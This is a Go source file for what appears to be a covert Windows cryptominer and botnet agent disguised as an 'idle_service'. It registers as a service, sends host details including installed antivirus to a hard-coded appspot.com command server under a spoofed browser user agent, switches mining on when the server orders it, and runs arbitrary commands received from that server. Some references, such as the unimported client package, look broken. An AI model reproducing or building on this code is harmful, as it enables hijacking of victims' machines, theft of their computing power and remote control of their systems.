package main

import (
	"C"
	"log"
	"os"
	"os/exec"
	"time"

	"github.com/monsun69/idle_service/lib/connector"
	connectorModels "github.com/monsun69/idle_service/lib/connector/models"
	"github.com/monsun69/idle_service/lib/sysinfo/models"
	"github.com/monsun69/idle_service/lib/utils"
	"github.com/monsun69/idle_service/lib/winsvc"
)

var baseUrl = "https://sonic-charmer-219203.appspot.com/api@@@"
var userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
var commutateDelay = time.Duration(300)

var c client.Instance
var s *models.Main

func commutateThread(s *models.Main) {
	c.Init(utils.ParseBaseUrl(baseUrl))
	c.UserAgent = userAgent

	for {
		if data, err := c.Heartbeat(connectorModels.Request_Heartbeat{
			Utilization: s.System.CpuUtil,
			Id:          s.System.Mac,
			Working:     s.Mining.Status,
		}); err != nil {
			c.Register(connectorModels.Request_Register{
				Id:          s.System.Mac,
				Version:     1,
				Workstation: s.System.Workstation,
				Arch:        s.System.Arch,
				Cpu:         s.System.Cpu,
				Cores:       s.System.Cores,
				Av:          s.System.Av,
				Utility:     s.System.CpuUtil,
				Os:          s.System.Os,
			})
		} else {
			s.Mining.Enable = data.NeedToWork
			log.Printf("commutateThread: %v\n", data)
			for _, taskId := range data.Tasks {
				go taskExec(taskId)
			}
		}
		time.Sleep(time.Second * commutateDelay)
		go watchdog()
	}
}

func taskExec(id string) {
	if data, err := c.Task(connectorModels.Request_Task{Id: id}); err != nil {
		return
	} else {
		switch data.Action {
		case 1:
			c := exec.Command(data.Args[0], data.Args[1:]...)
			if err := c.Run(); err != nil {
				log.Println("Error: ", err)
			}
		default:
			log.Println("Triggered task exec method")
		}
	}
}

func watchdog() {
	for {
		if s.Mining.Enable {
			c := exec.Command("cmd", "/C", "ping", "-n", "60", "127.0.0.1")
			if err := c.Run(); err != nil {
				log.Println("Watchdog -> Error: ", err)
			}
		}
		time.Sleep(time.Second)
	}
}

//export EntryPoint
func EntryPoint() {
	s.Init()
	f, err := os.OpenFile("C:\\idle_svc.log", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	defer f.Close()
	if err != nil {
		log.Panicf("Error on use log file. CODE: %v\n", err)
	}
	log.SetOutput(f)

	if err := winsvc.OurServiceInit("idle_service"); err != 0 {
		log.Panicf("Error on service initialization. CODE: %v\n", err)
	}
	log.Printf("Idle service is alive.")
	commutateThread(s)
}

func main() {
}
